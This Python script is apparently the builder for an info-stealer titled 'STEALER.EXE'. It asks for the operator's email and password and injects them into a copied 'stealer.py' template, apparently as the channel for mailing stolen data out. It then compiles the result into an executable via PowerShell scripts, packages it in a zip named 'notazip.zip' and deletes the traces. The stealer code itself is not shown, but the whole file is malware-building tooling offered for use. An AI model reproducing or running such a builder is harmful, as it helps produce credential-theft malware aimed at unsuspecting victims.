import subprocess
from time import sleep
import platform
from zipfile import *

print('''

░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░░░░███████╗██╗░░██╗███████╗
██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗░░░██╔════╝╚██╗██╔╝██╔════╝
╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝░░░█████╗░░░╚███╔╝░█████╗░░
░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗░░░██╔══╝░░░██╔██╗░██╔══╝░░
██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║██╗███████╗██╔╝╚██╗███████╗
╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
''')

print("\nRUN THIS ON WINDOWS ONLY!\n")

def replaceFileContent(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


#Check if system is windows
if platform.system() == "Windows":
    pass
else:
    print("\nThis script has to be run on windows only!\n")

mail = input("Enter your email >  ")
password = input("Enter your password >  ")

def main():
    print("\nCreating file....")

    subprocess.check_output("copy ./scripts/stealer.py this.py", shell=True)

    replaceFileContent("this.py", "testmail", mail)
    replaceFileContent("this.py", "testpass", password)

    print("\nCompiling executable...")
    sleep(5)

    subprocess.call("powershell ./scripts/setup.ps1")

    subprocess.call("del /f this.py", shell=True)

    with ZipFile('notazip.zip', 'w') as myzip:
        myzip.write('runthis.exe')
    subprocess.call("del /f runthis.exe", shell=True)
    subprocess.call("powershell ./scripts/final.ps1", shell=True)
    subprocess.call("del notazip.zip", shell=True)

if __name__ == "__main__":
   main()